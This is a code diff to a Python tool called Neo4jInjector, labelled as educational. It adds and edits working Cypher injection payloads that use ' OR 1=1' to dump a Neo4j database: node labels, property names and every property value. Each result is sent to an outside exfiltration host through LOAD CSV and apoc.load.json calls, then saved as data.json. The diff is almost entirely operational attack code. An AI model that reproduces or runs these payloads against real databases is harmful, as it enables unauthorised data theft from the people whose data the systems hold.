@@ -215,8 +215,8 @@ class Neo4jInjector:
         write_json_to_file(json_result, "apoc_installed.json")
         json_to_table(json_result)
 
-        if apoc_installed:
-            return True
+        # if apoc_installed:
+        #     return True
 
         # version = parsed_data.get("version")
         # if version.parse(given_version) >= version.parse("5.0"):
@@ -244,28 +244,36 @@ class Neo4jInjector:
             label_value = parsed_data.get('label')  # Extract the label value
             labels.append(label_value)
 
+        for label in labels:
+            print(f"[*] {label}")
 
-        label = input(f"Select label to dump {labels}: ")
+
+        label = input(f"Enter label to dump: ")
 
         # print("Dumping Properties")
         # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM '{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")
 
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?value_count=' + y as l RETURN 0 as _0 //")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")
 
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
-        value_count = parsed_data.get('value_count')  # Extract the label value
+        property_count = parsed_data.get('property_count')  # Extract the label value
 
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM '{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")
 
 
+
+    
+        parsed_data = extract_query_params(data)
+        print(parsed_data) 
         values = [] 
         while not data_queue.empty():
             pair = []
-            for _ in range(int(value_count)):
+            for _ in range(int(property_count)):
                 if not data_queue.empty():
                     data = data_queue.get()
+                    print(data)
                     parsed_data = extract_query_params(data)
                     pair.append(parsed_data)
                 else:
@@ -273,14 +281,85 @@ class Neo4jInjector:
                     break
             values.append(pair)
 
-        
+
+        print(values)
         json_result = convert_to_json(values)
+        print(json_result)
         write_json_to_file(json_result, "data.json")
         json_to_table(json_result)
 
     def apoc_exfil_data(self):
         print("Inside apoc exfil data")
 
+        # dump label count
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN value//")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        label_count = parsed_data.get('label_count')  # Extract the label value
+
+            
+        # dump labels    
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as all_label CALL apoc.load.json('{self.exfil_ip}/?labels='+apoc.text.join(all_label, ',')) YIELD value RETURN value//")
+
+        # Store labels
+        data = data_queue.get()
+        parsed_data = extract_query_params(data)
+        print(f"available labels [{label_count}]:")
+        labels = parsed_data['labels'].split(',')
+        for label in labels:
+            print(f"[*] {label}")
+
+
+        label = input(f"Enter label to dump: ")
+
+
+        # dump property count
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y CALL apoc.load.json('{self.exfil_ip}/?property_count=' + y) YIELD value RETURN value//")
+
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        property_count = parsed_data.get('property_count')  # Extract the label value
+
+        print(property_count)
+
+        # print("Dumping Properties")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,',')) YIELD value RETURN value//")
+
+        data = data_queue.get()
+        parsed_data = extract_query_params(data)
+        print(f"available properties [{property_count}]:")
+        properties = parsed_data['keys'].split(',')
+        for pr0perty in properties:
+            print(f"[*] {pr0perty}")
+
+
+        properties_dict = {}
+        for pr0perty in properties:
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty} CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + apoc.text.join({pr0perty}, ',')) YIELD value RETURN value//")
+            data = data_queue.get()
+            parsed_data = extract_query_params(data)
+            properties_dict.update(parsed_data)
+
+        print(properties_dict)
+        lists = {k: urllib.parse.unquote(v).split(',') for k, v in properties_dict.items()}
+
+        # take into account if some properties are NONE
+        max_length = max(len(lst) for lst in lists.values())
+
+        for key, lst in lists.items():
+            lists[key] = lst + [None] * (max_length - len(lst))
+
+        print(lists)
+        
+        zipped = zip(*lists.values())
+
+        values = [[{k: v} for k, v in zip(lists.keys(), values)] for values in zipped]
+
+        json_result = convert_to_json(values)
+        write_json_to_file(json_result, "data.json")
+        json_to_table(json_result)
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
